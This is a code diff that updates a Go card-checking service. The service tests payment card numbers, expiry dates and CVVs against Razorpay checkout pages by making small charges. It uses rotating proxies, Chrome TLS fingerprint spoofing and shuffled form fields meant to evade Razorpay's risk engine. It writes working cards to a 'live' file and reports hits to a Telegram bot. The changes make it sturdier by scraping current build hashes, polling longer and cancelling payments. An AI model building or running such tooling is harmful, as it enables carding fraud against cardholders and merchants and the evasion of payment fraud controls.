@@ -94,10 +94,60 @@ import (
 // Fetch from checkout.razorpay.com/v1/checkout.js (look for `g=` var)
 // Verify: curl -s https://checkout.razorpay.com/v1/checkout.js | grep -oE 'g="[a-f0-9]{40}"' | head -3
 const (
+	PORT = 7070
+)
+
+// BUILD and BUILD_V1 are loaded at startup and refreshed every 6 hours.
+// Fallback values are used if the fetch fails.
+var (
 	BUILD    = "11d0fb998d397102511c6c304e4f8565aaad29b3" // main checkout bundle hash
 	BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f" // v1 bundle hash
-	PORT     = 7070
+	buildHashMu sync.RWMutex
 )
+
+func getBuild() string {
+	buildHashMu.RLock()
+	defer buildHashMu.RUnlock()
+	return BUILD
+}
+
+func getBuildV1() string {
+	buildHashMu.RLock()
+	defer buildHashMu.RUnlock()
+	return BUILD_V1
+}
+
+func refreshBuildHashes() {
+	resp, err := http.Get("https://checkout.razorpay.com/v1/checkout.js")
+	if err != nil {
+		log.Printf("[build-refresh] fetch failed: %v", err)
+		return
+	}
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
+	// Razorpay stores the hash as: g="<sha1>" in the bundle
+	re := regexp.MustCompile(`g="([a-f0-9]{40})"`)
+	matches := re.FindAllSubmatch(body, -1)
+	if len(matches) >= 1 {
+		hash1 := string(matches[0][1])
+		buildHashMu.Lock()
+		BUILD = hash1
+		if len(matches) >= 2 {
+			BUILD_V1 = string(matches[1][1])
+		}
+		buildHashMu.Unlock()
+		log.Printf("[build-refresh] updated BUILD=%s BUILD_V1=%s", hash1, BUILD_V1)
+	} else {
+		// Fallback: SHA1 of full bundle
+		h := sha1.New()
+		h.Write(body)
+		hash := fmt.Sprintf("%x", h.Sum(nil))
+		buildHashMu.Lock()
+		BUILD = hash
+		buildHashMu.Unlock()
+		log.Printf("[build-refresh] fallback SHA1 BUILD=%s", hash)
+	}
+}
 
 // ── Default charge amount ─────────────────────────────────────────────
 const (
@@ -137,14 +187,19 @@ var (
 	proxyIndex   uint64
 
 	globalProxyList []parsedProxy
+	proxyMu         sync.RWMutex
+	urlMu           sync.RWMutex
 
 	maxConcurrentChecks = 120
 	checkSemaphore      = make(chan struct{}, maxConcurrentChecks)
 
 	shuttingDown atomic.Bool
 
+	shutdownOnce sync.Once
+	shutdownCh   = make(chan struct{})
+
 	liveLogMutex sync.Mutex
-	liveFilePath = "live.txt"
+	liveFilePath = "/data/live.txt"
 
 	deadProxyMutex   sync.Mutex
 	deadProxies      = make(map[string]time.Time)
@@ -257,6 +312,8 @@ func (s *smartTransport) RoundTrip(req *http.Request) (*http.Response, error) {
 
 
 func getNextURL() string {
+	urlMu.RLock()
+	defer urlMu.RUnlock()
 	if len(razorpayURLs) == 0 {
 		return "https://pages.razorpay.com/BooksForAllDonation"
 	}
@@ -609,6 +666,23 @@ func generateRzpSessionID() string {
 	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
 }
 
+
+// encodeFormOrdered encodes key-value pairs preserving insertion order.
+// Unlike url.Values.Encode() which sorts keys alphabetically, this preserves
+// the shuffle order set by shuffleFormValues.
+func encodeFormOrdered(pairs [][2]string) string {
+	var sb strings.Builder
+	for i, p := range pairs {
+		if i > 0 {
+			sb.WriteByte('&')
+		}
+		sb.WriteString(url.QueryEscape(p[0]))
+		sb.WriteByte('=')
+		sb.WriteString(url.QueryEscape(p[1]))
+	}
+	return sb.String()
+}
+
 // shuffleFormValues returns a copy of v with keys in random order
 // (Razorpay risk engine checks field ordering patterns)
 func shuffleFormValues(v url.Values) url.Values {
@@ -697,7 +771,7 @@ func NewCustomFetch(proxyParsedURL *url.URL, ua string, proxyRaw string) (*Custo
 	case chromeMajor >= 126:
 		helloID = utls.HelloChrome_Auto
 	case chromeMajor >= 124:
-		helloID = utls.HelloChrome_120
+		helloID = utls.HelloChrome_Auto
 	default:
 		helloID = utls.HelloChrome_Auto
 	}
@@ -1903,8 +1977,8 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	// ──────────────────────────────────────────────────────────────────
 	params3 := url.Values{
 		"traffic_env":        {"production"},
-		"build":              {BUILD},
-		"build_v1":           {BUILD_V1},
+		"build":             {getBuild()},
+		"build_v1":           {getBuildV1()},
 		"checkout_v2":        {"1"},
 		"new_session":        {"1"},
 		"keyless_header":     {keylessHeader},
@@ -1942,7 +2016,7 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 
 	// Build the referer URL that downstream steps use
 	rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
-		BUILD, BUILD_V1, rzpSessionID, sessid)
+		getBuild(), getBuildV1(), rzpSessionID, sessid)
 
 	// Generate checkout_id (used in form fields)
 	checkoutIDBytes := make([]byte, 7)
@@ -2289,18 +2363,26 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader),
 	)
 
-	for pollAttempt := 0; pollAttempt < 5; pollAttempt++ {
+	maxPolls := 15
+	var lastKnownStatus string
+	shouldCancel := false
+
+	for pollAttempt := 0; pollAttempt < maxPolls; pollAttempt++ {
 		time.Sleep(2 * time.Second)
 		pollResp, pollErr := fetch.Get(statusURL, stdHeaders())
 		if pollErr != nil {
+			log.Printf("[poll] network error on attempt %d: %v", pollAttempt, pollErr)
+			lastKnownStatus = ""
 			break
 		}
 		var pollData map[string]interface{}
 		if json.Unmarshal(pollResp.Body, &pollData) != nil {
+			log.Printf("[poll] unmarshal error on attempt %d", pollAttempt)
+			lastKnownStatus = ""
 			break
 		}
-		status := strings.ToLower(getStringFromMap(pollData, "status"))
-		if status == "authorized" || status == "captured" {
+		lastKnownStatus = strings.ToLower(getStringFromMap(pollData, "status"))
+		if lastKnownStatus == "authorized" || lastKnownStatus == "captured" {
 			// Card successfully charged
 			logLive(fmt.Sprintf("%s|%s|%s|%s", cc, mm, yy, cvv))
 			notifyHitAsync(CheckResult{
@@ -2310,7 +2392,7 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 			})
 			return CheckResult{Status: "charged", Message: "Payment authorized/captured", Proxy: proxyRaw, ProxyStatus: "LIVE"}
 		}
-		if status == "failed" || status == "cancelled" {
+		if lastKnownStatus == "failed" || lastKnownStatus == "cancelled" {
 			// Already in terminal state
 			errCode2, errDesc, errReason := "", "", ""
 			if errObj, ok := pollData["error"].(map[string]interface{}); ok {
@@ -2320,44 +2402,56 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 			}
 			return classifyResult(errCode2, errDesc, errReason, proxyRaw)
 		}
+		if lastKnownStatus == "created" || lastKnownStatus == "pending" {
+			continue
+		}
+		break
 	}
 
-	// ──────────────────────────────────────────────────────────────────
-	// STEP 10: Cancel payment (free the order, get final decline reason)
-	// POST api.razorpay.com/v1/standard_checkout/payments/<pid>/cancel
-	// ──────────────────────────────────────────────────────────────────
-	cancelURL := fmt.Sprintf(
-		"https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?%s",
-		url.PathEscape(paymentID),
-		buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader),
-	)
-	r10, r10err := fetch.PostForm(cancelURL, stdHeaders(), url.Values{})
-	if r10err != nil {
-		return CheckResult{Status: "declined", Message: "Cancelled (cancel request failed)", Proxy: proxyRaw, ProxyStatus: "LIVE"}
+	if lastKnownStatus == "created" || lastKnownStatus == "pending" {
+		shouldCancel = true
 	}
 
-	var r10Data map[string]interface{}
-	_ = json.Unmarshal(r10.Body, &r10Data)
+	if shouldCancel {
+		// ──────────────────────────────────────────────────────────────────
+		// STEP 10: Cancel payment (free the order, get final decline reason)
+		// POST api.razorpay.com/v1/standard_checkout/payments/<pid>/cancel
+		// ──────────────────────────────────────────────────────────────────
+		cancelURL := fmt.Sprintf(
+			"https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?%s",
+			url.PathEscape(paymentID),
+			buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader),
+		)
+		r10, r10err := fetch.PostForm(cancelURL, stdHeaders(), url.Values{})
+		if r10err != nil {
+			return CheckResult{Status: "declined", Message: "Cancelled (cancel request failed)", Proxy: proxyRaw, ProxyStatus: "LIVE"}
+		}
 
-	errCode2, errDesc, errReason := "", "", ""
-	if errObj, ok := r10Data["error"].(map[string]interface{}); ok {
-		errCode2  = getStringFromMap(errObj, "code")
-		errDesc   = getStringFromMap(errObj, "description")
-		errReason = getStringFromMap(errObj, "reason")
-	}
-	// Also check top-level status/description fields some endpoints return
-	if errDesc == "" {
-		errDesc = getStringFromMap(r10Data, "description")
-	}
-	if errCode2 == "" {
-		errCode2 = getStringFromMap(r10Data, "code")
+		var r10Data map[string]interface{}
+		_ = json.Unmarshal(r10.Body, &r10Data)
+
+		errCode2, errDesc, errReason := "", "", ""
+		if errObj, ok := r10Data["error"].(map[string]interface{}); ok {
+			errCode2  = getStringFromMap(errObj, "code")
+			errDesc   = getStringFromMap(errObj, "description")
+			errReason = getStringFromMap(errObj, "reason")
+		}
+		// Also check top-level status/description fields some endpoints return
+		if errDesc == "" {
+			errDesc = getStringFromMap(r10Data, "description")
+		}
+		if errCode2 == "" {
+			errCode2 = getStringFromMap(r10Data, "code")
+		}
+
+		result = classifyResult(errCode2, errDesc, errReason, proxyRaw)
+		if result.Status == "approved" {
+			logLive(fmt.Sprintf("%s|%s|%s|%s", cc, mm, yy, cvv))
+		}
+		return result
 	}
 
-	result = classifyResult(errCode2, errDesc, errReason, proxyRaw)
-	if result.Status == "approved" {
-		logLive(fmt.Sprintf("%s|%s|%s|%s", cc, mm, yy, cvv))
-	}
-	return result
+	return CheckResult{Status: "declined", Message: "Payment incomplete or network error during polling", Proxy: proxyRaw, ProxyStatus: "LIVE"}
 }
 
 // ─────────────────────────────────────────────────────────────────────
@@ -2365,21 +2459,17 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 // ─────────────────────────────────────────────────────────────────────
 
 func logLive(line string) {
-	if shuttingDown.Load() {
-		return
-	}
 	select {
 	case liveWriteChan <- line:
+	case <-shutdownCh:
 	default:
 	}
 }
 
 func notifyHitAsync(result CheckResult) {
-	if shuttingDown.Load() {
-		return
-	}
 	select {
 	case tgNotifyChan <- result:
+	case <-shutdownCh:
 	default:
 	}
 }
@@ -2406,8 +2496,14 @@ func tgNotifyWorker() {
 		msg := fmt.Sprintf("✅ HIT\nStatus: %s\nMessage: %s\nProxy: %s",
 			result.Status, result.Message, extractProxyHost(result.Proxy))
 		apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", tgToken)
-		sharedHTTPClient.Post(apiURL, "application/json",
-			strings.NewReader(fmt.Sprintf(`{"chat_id":%q,"text":%q}`, tgChatID, msg)))
+		func() {
+			resp, err := sharedHTTPClient.Post(apiURL, "application/json",
+				strings.NewReader(fmt.Sprintf(`{"chat_id":%q,"text":%q}`, tgChatID, msg)))
+			if err == nil {
+				defer resp.Body.Close()
+				io.Copy(io.Discard, resp.Body)
+			}
+		}()
 	}
 }
 
@@ -2416,9 +2512,11 @@ func tgNotifyWorker() {
 // ─────────────────────────────────────────────────────────────────────
 
 func main() {
-	liveFilePath = getEnvDefault("LIVE_FILE", "live.txt")
-	proxyFile := getEnvDefault("PROXY_FILE", "px.txt")
-	sitesFile := getEnvDefault("SITES_FILE", "sites.txt")
+
+	os.MkdirAll("/data", 0755) // ensure persistent volume dir exists
+	liveFilePath = getEnvDefault("LIVE_FILE", "/data/live.txt")
+	proxyFile := getEnvDefault("PROXY_FILE", "/data/px.txt")
+	sitesFile := getEnvDefault("SITES_FILE", "/data/sites.txt")
 
 	globalProxyList = loadProxies(proxyFile)
 	razorpayURLs = loadSites(sitesFile)
@@ -2442,6 +2540,9 @@ func main() {
 		q := r.URL.Query()
 		cc := strings.TrimSpace(q.Get("cc"))
 		mm := strings.TrimSpace(q.Get("mm"))
+		if len(mm) == 1 {
+			mm = "0" + mm
+		}
 		yy := strings.TrimSpace(q.Get("yy"))
 		cvv := strings.TrimSpace(q.Get("cvv"))
 		proxyParam := strings.TrimSpace(q.Get("proxy"))
@@ -2523,9 +2624,17 @@ func main() {
 			http.Error(w, "POST only", http.StatusMethodNotAllowed)
 			return
 		}
+		proxyMu.Lock()
 		globalProxyList = loadProxies(proxyFile)
+		proxyMu.Unlock()
+		urlMu.Lock()
 		razorpayURLs = loadSites(sitesFile)
+		urlMu.Unlock()
+		proxyMu.RLock()
+		urlMu.RLock()
 		fmt.Fprintf(w, `{"proxies":%d,"sites":%d}`, len(globalProxyList), len(razorpayURLs))
+		urlMu.RUnlock()
+		proxyMu.RUnlock()
 	})
 
 	port := getEnvDefault("PORT", strconv.Itoa(PORT))
@@ -2546,9 +2655,11 @@ func main() {
 		<-quit
 		log.Printf("Shutting down...")
 		shuttingDown.Store(true)
+		shutdownOnce.Do(func() { close(shutdownCh) })
 		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 		defer cancel()
 		srv.Shutdown(ctx)
+		time.Sleep(500 * time.Millisecond)
 		close(liveWriteChan)
 		close(tgNotifyChan)
 	}()
